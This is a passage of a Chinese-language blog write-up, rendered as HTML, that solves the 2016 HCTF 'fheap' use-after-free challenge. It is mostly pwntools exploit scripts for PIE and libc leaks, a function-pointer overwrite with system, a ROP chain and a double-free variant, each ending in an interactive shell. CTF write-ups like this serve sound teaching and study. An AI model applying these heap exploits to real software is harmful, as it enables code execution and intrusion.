class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_2_1_stdout_=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>,_IO_2_1_stdout_)</span><br><span class="line">base=_IO_2_1_stdout_-libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;sh;&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;1&#x27;</span>)+p64(system)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>前面这种方法不知道为什么在高版本glibc下拿不到shell，这里我们再delete是发现会在栈上输入，这样我也可以构造rop链来拿到shell</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230308005837886.png" alt="image-20230308005837886"></p>
+<p>我们需要输入yes占8个字节绕过strncmp，然后四个pop到后面ret的地址，进行rop</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230308011254973.png" alt="image-20230308011254973"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\x1a&#x27;</span></span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">pie=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xD1A</span></span><br><span class="line"><span class="comment"># s(b&#x27;quit &#x27;)</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_plt=pie+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;%15$p&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>)+p64(printf_plt)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">_IO_file_write=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">45</span></span><br><span class="line">p(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;_IO_file_write&#x27;</span>,_IO_file_write)</span><br><span class="line">base=_IO_file_write-libc.dump(<span class="string">&#x27;_IO_file_write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pop4=pie+<span class="number">0x00000000000011dc</span></span><br><span class="line">rdi=<span class="number">0x00000000000011e3</span>+pie</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(pop4)</span><br><span class="line">create(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;delete\nid:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload= <span class="string">b&quot;yesaaaaa&quot;</span> + p64(rdi) + p64(bin_sh) + p64(<span class="number">0x949</span>+pie)+p64(system)</span><br><span class="line">sla(<span class="string">&quot;sure?:&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>我们还可以利用都变了free来做free函数调用hook</p>
+<p>如果我们先申请两个string chunk</p>
+<p>create(5,b’hello’)<br>create(5,b’grxer’)</p>
+<p>再释放</p>
+<p>delete(0)<br>delete(1)<br>delete(0)</p>
+<p>这样我们的fastbin会在0和1直接有一个回环链表</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230308124636807.png" alt="image-20230308124636807"></p>
+<p>我们再次</p>
+<p>create(4, b’fsf’)<br>create(0x20, b’a’ * 0x16 + b’lo’ + b’\x2d\x00’)</p>
+<p>第一个create会申请到第一个string堆块，第二个creat会申请到第二个string堆块，和第一个string堆块作为context存储区，而我们的第一个creat会把该块当作自己的struct，这样就可以控制它的free指针，改写为puts指针输出puts地址，找到基址</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230308125210074.png" alt="image-20230308125210074"></p>
+<p>我们再次delete(1),再次申请一个context大于0xf&lt;&#x3D;0x28的chunk即可循环利用</p>
+<h4 id="exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"><a href="#exp-这里只泄露和循环利用，配合前面的两种思路的任何一种都可以" class="headerlink" title="exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以"></a>exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn-f&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;create &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Pls give string size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;str:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&quot;delete &quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Are you sure?:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;yes&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0xe93)&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;hello&#x27;</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="string">b&#x27;grxer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&#x27;fsf&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x16</span> + <span class="string">b&#x27;lo&#x27;</span> + <span class="string">b&#x27;\x2d\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Using-After-Free"><span class="toc-number">1.</span> <span class="toc-text">Using-After-Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-training-lib10"><span class="toc-number">1.1.</span> <span class="toc-text">HITCON-training lib10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tchche-bin"><span class="toc-number">1.1.1.</span> <span class="toc-text">tchche bin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-HCTF-fheap"><span class="toc-number">1.2.</span> <span class="toc-text">2016 HCTF fheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#using-after-free"><span class="toc-number">1.2.1.</span> <span class="toc-text">using after free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAcall-puts%EF%BC%8C%E6%B3%84%E9%9C%B2pie%E5%9F%BA%E5%9D%80"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">覆盖为call puts，泄露pie基址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAprintf%EF%BC%8C%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">覆盖为printf，利用格式化字符串漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E4%B8%BAsystem"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">覆盖为system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-number">1.2.2.</span> <span class="toc-text">double free</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-%E8%BF%99%E9%87%8C%E5%8F%AA%E6%B3%84%E9%9C%B2%E5%92%8C%E5%BE%AA%E7%8E%AF%E5%88%A9%E7%94%A8%EF%BC%8C%E9%85%8D%E5%90%88%E5%89%8D%E9%9D%A2%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%80%9D%E8%B7%AF%E7%9A%84%E4%BB%BB%E4%BD%95%E4%B8%80%E7%A7%8D%E9%83%BD%E5%8F%AF%E4%BB%A5"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">exp 这里只泄露和循环利用，配合前面的两种思路的任何一种都可以</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/04/Using-After-Free/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&text=Using-After-Free"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&is_video=false&description=Using-After-Free"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Using-After-Free&body=Check out this article: https://grxer.gitee.io/2023/03/04/Using-After-Free/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&title=Using-After-Free"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/04/Using-After-Free/&name=Using-After-Free&description=&lt;h1 id=&#34;Using-After-Free&#34;&gt;&lt;a href=&#34;#Using-After-Free&#34; class=&#34;headerlink&#34; title=&#34;Using-After-Free&#34;&gt;&lt;/a&gt;Using-After-Free&lt;/h1&gt;&lt;p&gt;总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/04/Using-After-Free/&t=Using-After-Free"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
